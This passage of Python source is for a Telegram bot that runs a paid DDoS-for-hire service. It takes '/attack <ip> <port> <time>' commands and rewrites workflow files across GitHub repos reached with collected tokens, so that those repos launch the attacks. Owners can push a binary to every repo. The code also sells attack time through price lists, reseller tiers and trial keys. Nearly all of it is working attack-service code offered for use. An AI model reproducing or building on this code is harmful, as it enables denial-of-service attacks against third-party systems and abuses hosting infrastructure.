            await query.message.edit_text("⚠️ ACCESS DENIED\nOnly owners can set cooldown.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        await query.message.edit_text("⏱️ SET COOLDOWN\n\nEnter new cooldown duration in seconds:\n\nExample: 60\nMinimum: 10 seconds\n\nSend /cancel to abort.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]]))
        context.user_data['waiting_for_cooldown'] = True
    elif data == "set_max_attack_prompt":
        if not is_owner(user_id):
            await query.message.edit_text("⚠️ ACCESS DENIED\nOnly owners can set max attacks.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        await query.message.edit_text("🎯 SET MAX ATTACK\n\nEnter maximum attacks per user:\n\nExample: 100\n\nSend /cancel to abort.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]]))
        context.user_data['waiting_for_max_attack'] = True
    elif data == "gen_trial_key_prompt":
        if not is_owner(user_id):
            await query.message.edit_text("⚠️ ACCESS DENIED\nOnly owners can generate trial keys.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        await query.message.edit_text("🎫 GENERATE TRIAL KEY\n\nEnter duration in hours:\n\nExample: 24\n\nSend /cancel to abort.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]]))
        context.user_data['waiting_for_trial_hours'] = True
    elif data == "remove_expired_tokens":
        if not is_owner(user_id):
            await query.message.edit_text("⚠️ ACCESS DENIED\nOnly owners can remove expired tokens.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        progress_msg = await query.message.edit_text("🔄 Checking tokens...")
        valid_tokens = []
        expired_tokens = []
        for token_data in github_tokens:
            try:
                g = Github(token_data['token'])
                user = g.get_user()
                _ = user.login
                valid_tokens.append(token_data)
            except:
                expired_tokens.append(token_data)
        if not expired_tokens:
            await progress_msg.edit_text("✅ All tokens are valid.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        github_tokens.clear()
        github_tokens.extend(valid_tokens)
        save_github_tokens(github_tokens)
        expired_list = f"🗑️ EXPIRED TOKENS REMOVED:\n\n"
        for token in expired_tokens:
            expired_list += f"• {token['username']} - {token['repo']}\n"
        expired_list += f"\n📊 Remaining: {len(valid_tokens)}"
        await progress_msg.edit_text(expired_list, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
    elif data == "price_list":
        price_text = """💰 USER PRICE LIST

1 day = ₹120
2 days = ₹240
3 days = ₹360
4 days = ₹450
7 days = ₹650

Contact admin for purchase."""
        await query.message.edit_text(price_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
    elif data == "reseller_price_list":
        price_text = """💎 RESELLER PRICE LIST

1 day = ₹150
2 days = ₹250
3 days = ₹300
4 days = ₹400
7 days = ₹550

Contact admin for reseller access."""
        await query.message.edit_text(price_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
    elif data == "owner_panel":
        if not is_owner(user_id):
            await query.message.edit_text("⚠️ ACCESS DENIED\nOnly owners can access this panel.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
            return
        keyboard = create_owner_panel_keyboard()
        text = """👑 OWNER PANEL

Manage owners, resellers, and broadcast.

Select an option:"""
        await query.message.edit_text(text, reply_markup=keyboard)
    elif data == "add_owner_prompt":
        if not is_owner(user_id):
            await query.message.edit_text("⚠️ ACCESS DENIED", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        await query.message.edit_text("➕ ADD OWNER\n\nEnter user ID to make owner:\n\nExample: 123456789\n\nSend /cancel to abort.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]]))
        context.user_data['waiting_for_add_owner'] = True
    elif data == "delete_owner_prompt":
        if not is_owner(user_id):
            await query.message.edit_text("⚠️ ACCESS DENIED", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        await query.message.edit_text("➖ DELETE OWNER\n\nEnter user ID to remove owner:\n\nExample: 123456789\n\nSend /cancel to abort.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]]))
        context.user_data['waiting_for_delete_owner'] = True
    elif data == "add_reseller_prompt":
        if not is_owner(user_id):
            await query.message.edit_text("⚠️ ACCESS DENIED", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        await query.message.edit_text("➕ ADD RESELLER\n\nEnter user ID to make reseller:\n\nExample: 123456789\n\nSend /cancel to abort.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]]))
        context.user_data['waiting_for_add_reseller'] = True
    elif data == "remove_reseller_prompt":
        if not is_owner(user_id):
            await query.message.edit_text("⚠️ ACCESS DENIED", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        await query.message.edit_text("➖ REMOVE RESELLER\n\nEnter user ID to remove reseller:\n\nExample: 123456789\n\nSend /cancel to abort.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]]))
        context.user_data['waiting_for_remove_reseller'] = True
    elif data == "broadcast_prompt":
        if not is_owner(user_id):
            await query.message.edit_text("⚠️ ACCESS DENIED", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        await query.message.edit_text("📢 BROADCAST MESSAGE\n\nEnter message to broadcast to all users:\n\nSend /cancel to abort.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]]))
        context.user_data['waiting_for_broadcast'] = True
    elif data == "list_groups":
        if not is_owner(user_id):
            await query.message.edit_text("⚠️ ACCESS DENIED", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        if not groups:
            await query.message.edit_text("📭 No groups registered", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        groups_list = "📊 REGISTERED GROUPS\n\n"
        for group_id, group_info in groups.items():
            groups_list += f"• {group_info.get('name', 'Unknown')}\n  ID: {group_id}\n"
        groups_list += f"\n📊 Total: {len(groups)}"
        await query.message.edit_text(groups_list, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
    elif data == "token_management":
        if not is_owner(user_id):
            await query.message.edit_text("⚠️ ACCESS DENIED\nOnly owners can manage tokens.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
            return
        keyboard = create_token_management_keyboard()
        text = """🔐 TOKEN MANAGEMENT PANEL

Manage GitHub tokens and binary uploads.

Select an option:"""
        await query.message.edit_text(text, reply_markup=keyboard)
    elif data == "add_token_prompt":
        if not is_owner(user_id):
            await query.message.edit_text("⚠️ ACCESS DENIED", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        await query.message.edit_text("➕ ADD TOKEN\n\nEnter GitHub token:\n\nExample: ghp_xxxxxxxxxxxx\n\nSend /cancel to abort.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]]))
        context.user_data['waiting_for_add_token'] = True
    elif data == "view_tokens":
        if not is_owner(user_id):
            await query.message.edit_text("⚠️ ACCESS DENIED", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        if not github_tokens:
            await query.message.edit_text("📭 No tokens added yet.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        tokens_list = "🔑 SERVERS LIST:\n\n"
        for i, token_data in enumerate(github_tokens, 1):
            tokens_list += f"{i}. 👤 {token_data['username']}\n   📁 {token_data['repo']}\n\n"
        tokens_list += f"📊 Total: {len(github_tokens)}"
        await query.message.edit_text(tokens_list, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
    elif data == "remove_token_prompt":
        if not is_owner(user_id):
            await query.message.edit_text("⚠️ ACCESS DENIED", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        if not github_tokens:
            await query.message.edit_text("📭 No tokens to remove.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        await query.message.edit_text(f"➖ REMOVE TOKEN\n\nEnter token number (1-{len(github_tokens)}):\n\nSend /cancel to abort.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]]))
        context.user_data['waiting_for_remove_token'] = True
    elif data == "upload_binary_prompt":
        if not is_owner(user_id):
            await query.message.edit_text("⚠️ ACCESS DENIED", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        if not github_tokens:
            await query.message.edit_text("❌ NO SERVERS AVAILABLE\nNo servers added. Use Add Token first.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        await query.message.edit_text("📤 BINARY UPLOAD\n\nSend your binary file now.\nIt will be uploaded to all GitHub repos as 'soul' file.\n\nSend /cancel to abort.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]]))
        context.user_data['waiting_for_binary'] = True
    elif data == "help_menu":
        if is_owner(user_id) or is_admin(user_id):
            help_text = """🆘 HELP - AVAILABLE COMMANDS

FOR ALL USERS:
• /attack <ip> <port> <time>
• /status - Check status
• /stop - Stop attack
• /id - Get your ID
• /myaccess - Check access
• /help - Show help
• /redeem <key> - Redeem trial key

ADMIN COMMANDS:
• /add <id> <days> - Add user
• /remove <id> - Remove user
• /userslist - List users
• /approveuserslist - Pending list
• /ownerlist - List owners
• /adminlist - List admins
• /resellerlist - List resellers
• /pricelist - Show prices
• /resellerpricelist - Reseller prices
• /listgrp - List groups
• /maintenance <on/off>
• /broadcast - Send broadcast
• /setcooldown <seconds>
• /setmaxattack <number>
• /gentrailkey <hours>
• /addtoken - Add github token
• /tokens - List tokens
• /removetoken - Remove token
• /removexpiredtoken - Remove expired
• /binary_upload - Upload binary
• /addowner - Add owner
• /deleteowner - Remove owner
• /addreseller - Add reseller
• /removereseller - Remove reseller

Need help? Contact admin."""
        elif can_user_attack(user_id):
            help_text = """🆘 HELP - AVAILABLE COMMANDS

• /attack <ip> <port> <time>
• /status - Check status
• /stop - Stop attack
• /id - Get your ID
• /myaccess - Check access
• /help - Show help
• /redeem <key> - Redeem trial key

Need help? Contact admin."""
        else:
            help_text = f"""🆘 HELP

• /id - Get your user ID
• /help - Show help
• /redeem <key> - Redeem trial key

TO GET ACCESS:
1. Use /start to request
2. Contact admin
3. Wait for approval

Your ID: {user_id}"""
        await query.message.edit_text(help_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
    elif data.startswith("approve_"):
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.edit_text("⚠️ ACCESS DENIED", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        new_user_id = int(data.replace("approve_", ""))
        pending_users[:] = [u for u in pending_users if str(u['user_id']) != str(new_user_id)]
        save_pending_users(pending_users)
        expiry = time.time() + (7 * 24 * 60 * 60)
        approved_users[str(new_user_id)] = {"username": f"user_{new_user_id}", "added_by": user_id, "added_date": time.strftime("%Y-%m-%d %H:%M:%S"), "expiry": expiry, "days": 7}
        save_approved_users(approved_users)
        try:
            await context.bot.send_message(chat_id=new_user_id, text="✅ ACCESS APPROVED!\nYour access has been approved for 7 days.\nUse /start to access the bot.")
        except:
            pass
        await query.message.edit_text(f"✅ USER APPROVED!\n\nUser ID: {new_user_id}\nDuration: 7 days\nApproved by: {user_id}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📋 View Pending", callback_data="users_list"), InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
    elif data == "cancel_operation":
        context.user_data.clear()
        await query.message.edit_text("❌ OPERATION CANCELLED", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]]))

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack, cooldown_until, COOLDOWN_DURATION, MAX_ATTACKS
    user_id = update.effective_user.id
    text = update.message.text
    if text.startswith('/'):
        return
    if context.user_data.get('waiting_for_attack_target'):
        context.user_data['waiting_for_attack_target'] = False
        parts = text.split()
        if len(parts) != 3:
            await update.message.reply_text("❌ INVALID FORMAT\nFormat: <ip> <port> <duration>\nExample: 192.168.1.1 80 120", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
            return
        ip, port, time_val = parts
        if not is_valid_ip(ip):
            await update.message.reply_text("⚠️ INVALID IP\nIPs starting with '15' or '96' are not allowed.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
            return
        method, method_name = get_attack_method(ip)
        if method is None:
            await update.message.reply_text(f"⚠️ INVALID IP\n{method_name}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
            return
        try:
            attack_duration = int(time_val)
            if attack_duration <= 0:
                await update.message.reply_text("❌ INVALID TIME\nTime must be positive", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
                return
        except ValueError:
            await update.message.reply_text("❌ INVALID TIME\nTime must be a number", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
            return
        if not github_tokens:
            await update.message.reply_text("❌ NO SERVERS AVAILABLE\nContact admin.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
            return
        start_attack(ip, port, time_val, user_id, method)
        progress_msg = await update.message.reply_text("🔄 STARTING ATTACK...")
        success_count = 0
        fail_count = 0
        threads = []
        results = []
        def update_single_token(token_data):
            try:
                result = update_yml_file(token_data['token'], token_data['repo'], ip, port, time_val, method)
                results.append((token_data['username'], result))
            except:
                results.append((token_data['username'], False))
        for token_data in github_tokens:
            thread = threading.Thread(target=update_single_token, args=(token_data,))
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()
        for username, success in results:
            if success:
                success_count += 1
            else:
                fail_count += 1
        user_id_str = str(user_id)
        remaining_attacks = MAX_ATTACKS - user_attack_counts.get(user_id_str, 0)
        message = f"🎯 ATTACK STARTED!\n\nTarget: {ip}:{port}\nTime: {time_val}s\nServers: {success_count}\nMethod: {method_name}\nCooldown: {COOLDOWN_DURATION}s\nRemaining: {remaining_attacks}/{MAX_ATTACKS}"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("📊 Check Status", callback_data="check_status"), InlineKeyboardButton("🛑 Stop", callback_data="stop_attack")], [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]])
        await progress_msg.edit_text(message, reply_markup=keyboard)
        def monitor_attack_completion():
            time.sleep(attack_duration)
            finish_attack()
            logger.info(f"Attack completed after {attack_duration} seconds")
        monitor_thread = threading.Thread(target=monitor_attack_completion)
        monitor_thread.daemon = True
        monitor_thread.start()
    elif context.user_data.get('waiting_for_add_user'):
        context.user_data['waiting_for_add_user'] = False
        parts = text.split()
        if len(parts) != 2:
            await update.message.reply_text("❌ INVALID FORMAT\nFormat: <user_id> <days>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            return
        try:
            new_user_id = int(parts[0])
            days = int(parts[1])
            pending_users[:] = [u for u in pending_users if str(u['user_id']) != str(new_user_id)]
            save_pending_users(pending_users)
            if days == 0:
                expiry = "LIFETIME"
            else:
                expiry = time.time() + (days * 24 * 60 * 60)
            approved_users[str(new_user_id)] = {"username": f"user_{new_user_id}", "added_by": user_id, "added_date": time.strftime("%Y-%m-%d %H:%M:%S"), "expiry": expiry, "days": days}
            save_approved_users(approved_users)
            try:
                await context.bot.send_message(chat_id=new_user_id, text=f"✅ ACCESS APPROVED!\nYour access has been approved for {days} days.\nUse /start to access the bot.")
            except:
                pass
            await update.message.reply_text(f"✅ USER ADDED\n\nUser ID: {new_user_id}\nDuration: {days} days\nAdded by: {user_id}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID or days", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
    elif context.user_data.get('waiting_for_remove_user'):
        context.user_data['waiting_for_remove_user'] = False
        try:
            user_to_remove = int(text)
            user_to_remove_str = str(user_to_remove)
            removed = False
            if user_to_remove_str in approved_users:
                del approved_users[user_to_remove_str]
                save_approved_users(approved_users)
                removed = True
            pending_users[:] = [u for u in pending_users if str(u['user_id']) != user_to_remove_str]
            save_pending_users(pending_users)
            if user_to_remove_str in user_attack_counts:
                del user_attack_counts[user_to_remove_str]
                save_user_attack_counts(user_attack_counts)
            if removed:
                await update.message.reply_text(f"✅ USER REMOVED\n\nUser ID: {user_to_remove}\nRemoved by: {user_id}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
                try:
                    await context.bot.send_message(chat_id=user_to_remove, text="🚫 ACCESS REMOVED\nYour access has been revoked. Contact admin.")
                except:
                    pass
            else:
                await update.message.reply_text(f"❌ USER NOT FOUND\nUser ID {user_to_remove} not found.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
    elif context.user_data.get('waiting_for_cooldown'):
        context.user_data['waiting_for_cooldown'] = False
        try:
            new_cooldown = int(text)
            if new_cooldown < 10:
                await update.message.reply_text("❌ Cooldown must be at least 10 seconds", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
                return
            COOLDOWN_DURATION = new_cooldown
            save_cooldown(new_cooldown)
            await update.message.reply_text(f"✅ COOLDOWN UPDATED\n\nNew cooldown: {COOLDOWN_DURATION} seconds", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
        except ValueError:
            await update.message.reply_text("❌ Invalid number", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
    elif context.user_data.get('waiting_for_max_attack'):
        context.user_data['waiting_for_max_attack'] = False
        try:
            new_max = int(text)
            if new_max < 1:
                await update.message.reply_text("❌ Max attacks must be at least 1", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
                return
            MAX_ATTACKS = new_max
            save_max_attacks(new_max)
            await update.message.reply_text(f"✅ MAX ATTACKS UPDATED\n\nNew maximum: {MAX_ATTACKS} attacks", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
        except ValueError:
            await update.message.reply_text("❌ Invalid number", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
    elif context.user_data.get('waiting_for_trial_hours'):
        context.user_data['waiting_for_trial_hours'] = False
        try:
            hours = int(text)
            if hours < 1:
                await update.message.reply_text("❌ Hours must be at least 1", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
                return
            key = generate_trial_key(hours)
            await update.message.reply_text(f"🎫 TRIAL KEY GENERATED\n\nKey: `{key}`\nDuration: {hours} hours\n\nShare this key with users.\nThey can redeem with: /redeem {key}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
        except ValueError:
            await update.message.reply_text("❌ Invalid number", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
    elif context.user_data.get('waiting_for_add_owner'):
        context.user_data['waiting_for_add_owner'] = False
        try:
            new_owner_id = int(text)
            if str(new_owner_id) in owners:
                await update.message.reply_text("❌ Already an owner", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
                return
            owners[str(new_owner_id)] = {"username": f"owner_{new_owner_id}", "added_by": user_id, "added_date": time.strftime("%Y-%m-%d %H:%M:%S"), "is_primary": False}
            save_owners(owners)
            await update.message.reply_text(f"✅ OWNER ADDED\n\nUser ID: {new_owner_id}\nAdded by: {user_id}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            try:
                await context.bot.send_message(chat_id=new_owner_id, text="👑 OWNER ACCESS GRANTED\nYou have been given owner privileges.")
            except:
                pass
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
    elif context.user_data.get('waiting_for_delete_owner'):
        context.user_data['waiting_for_delete_owner'] = False
        try:
            owner_to_delete = int(text)
            if str(owner_to_delete) not in owners:
                await update.message.reply_text("❌ Not an owner", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
                return
            if owners[str(owner_to_delete)].get('is_primary'):
                await update.message.reply_text("❌ Cannot remove primary owner", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
                return
            del owners[str(owner_to_delete)]
            save_owners(owners)
            await update.message.reply_text(f"✅ OWNER REMOVED\n\nUser ID: {owner_to_delete}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
    elif context.user_data.get('waiting_for_add_reseller'):
        context.user_data['waiting_for_add_reseller'] = False
        try:
            new_reseller_id = int(text)
            if str(new_reseller_id) in resellers:
                await update.message.reply_text("❌ Already a reseller", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
                return
            resellers[str(new_reseller_id)] = {"username": f"reseller_{new_reseller_id}", "added_by": user_id, "added_date": time.strftime("%Y-%m-%d %H:%M:%S"), "credits": 0, "expiry": "LIFETIME"}
            save_resellers(resellers)
            await update.message.reply_text(f"✅ RESELLER ADDED\n\nUser ID: {new_reseller_id}\nAdded by: {user_id}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
            try:
                await context.bot.send_message(chat_id=new_reseller_id, text="💰 RESELLER ACCESS GRANTED\nYou have been given reseller privileges.")
            except:
                pass
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
    elif context.user_data.get('waiting_for_remove_reseller'):
        context.user_data['waiting_for_remove_reseller'] = False
        try:
            reseller_to_remove = int(text)
            if str(reseller_to_remove) not in resellers:
                await update.message.reply_text("❌ Not a reseller", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
                return
            del resellers[str(reseller_to_remove)]
            save_resellers(resellers)
            await update.message.reply_text(f"✅ RESELLER REMOVED\n\nUser ID: {reseller_to_remove}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
    elif context.user_data.get('waiting_for_broadcast'):
        context.user_data['waiting_for_broadcast'] = False
        broadcast_msg = text
        progress_msg = await update.message.reply_text("📢 Broadcasting...")
        success = 0
        failed = 0
        for uid in list(approved_users.keys()) + list(owners.keys()) + list(admins.keys()) + list(resellers.keys()):
            try:
                await context.bot.send_message(chat_id=int(uid), text=f"📢 BROADCAST MESSAGE\n\n{broadcast_msg}")
                success += 1
            except:
                failed += 1
        await progress_msg.edit_text(f"✅ BROADCAST COMPLETE\n\nSuccess: {success}\nFailed: {failed}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
    elif context.user_data.get('waiting_for_add_token'):
        context.user_data['waiting_for_add_token'] = False
        token = text.strip()
        repo_name = "soulcrack-tg"
        try:
            for existing_token in github_tokens:
                if existing_token['token'] == token:
                    await update.message.reply_text("❌ Token already exists.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
                    return
            g = Github(token)
            user = g.get_user()
            username = user.login
            repo, created = create_repository(token, repo_name)
            new_token_data = {'token': token, 'username': username, 'repo': f"{username}/{repo_name}", 'added_date': time.strftime("%Y-%m-%d %H:%M:%S"), 'status': 'active'}
            github_tokens.append(new_token_data)
            save_github_tokens(github_tokens)
            if created:
                message = f"✅ NEW REPO CREATED!\n\nUsername: {username}\nRepo: {repo_name}\nTotal servers: {len(github_tokens)}"
            else:
                message = f"✅ TOKEN ADDED!\n\nUsername: {username}\nRepo: {repo_name}\nTotal servers: {len(github_tokens)}"
            await update.message.reply_text(message, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
        except Exception as e:
            await update.message.reply_text(f"❌ ERROR\n{str(e)}\nCheck token.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
    elif context.user_data.get('waiting_for_remove_token'):
        context.user_data['waiting_for_remove_token'] = False
        try:
            token_num = int(text)
            if token_num < 1 or token_num > len(github_tokens):
                await update.message.reply_text(f"❌ Invalid number. Use 1-{len(github_tokens)}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
                return
            removed_token = github_tokens.pop(token_num - 1)
            save_github_tokens(github_tokens)
            await update.message.reply_text(f"✅ SERVER REMOVED!\n\nServer: {removed_token['username']}\nRepo: {removed_token['repo']}\nRemaining: {len(github_tokens)}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
        except ValueError:
            await update.message.reply_text("❌ Invalid number", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))
    elif context.user_data.get('waiting_for_binary'):
        await update.message.reply_text("❌ Please send a file, not text.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]]))

async def handle_binary_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ Permission denied")
        return
    if not context.user_data.get('waiting_for_binary'):
        return
    context.user_data['waiting_for_binary'] = False
    if not update.message.document:
        await update.message.reply_text("❌ Please send a file")
        return
    progress_msg = await update.message.reply_text("📥 DOWNLOADING BINARY...")
    try:
        file = await update.message.document.get_file()
        file_path = f"temp_binary_{user_id}.bin"
        await file.download_to_drive(file_path)
        with open(file_path, 'rb') as f:
            binary_content = f.read()
        file_size = len(binary_content)
        await progress_msg.edit_text(f"📊 FILE DOWNLOADED: {file_size} bytes\n📤 Uploading to all repos...")
        success_count = 0
        fail_count = 0
        results = []
        def upload_to_repo(token_data):
            try:
                g = Github(token_data['token'])
                repo = g.get_repo(token_data['repo'])
                try:
                    existing_file = repo.get_contents(BINARY_FILE_NAME)
                    repo.update_file(BINARY_FILE_NAME, "Update binary", binary_content, existing_file.sha, branch="main")
                    results.append((token_data['username'], True, "Updated"))
                except:
                    repo.create_file(BINARY_FILE_NAME, "Upload binary", binary_content, branch="main")
                    results.append((token_data['username'], True, "Created"))
            except Exception as e:
                results.append((token_data['username'], False, str(e)))
        threads = []
        for token_data in github_tokens:
            thread = threading.Thread(target=upload_to_repo, args=(token_data,))
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()
        for username, success, status in results:
            if success:
                success_count += 1
            else:
                fail_count += 1
        os.remove(file_path)
        message = f"✅ BINARY UPLOAD COMPLETED!\n\n📊 RESULTS:\n• ✅ Successful: {success_count}\n• ❌ Failed: {fail_count}\n• 📊 Total: {len(github_tokens)}\n\n📁 FILE: {BINARY_FILE_NAME}\n📦 SIZE: {file_size} bytes\n⚙️ STATUS: ✅ READY"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="cancel_operation")]])
        await progress_msg.edit_text(message, reply_markup=keyboard)
    except Exception as e:
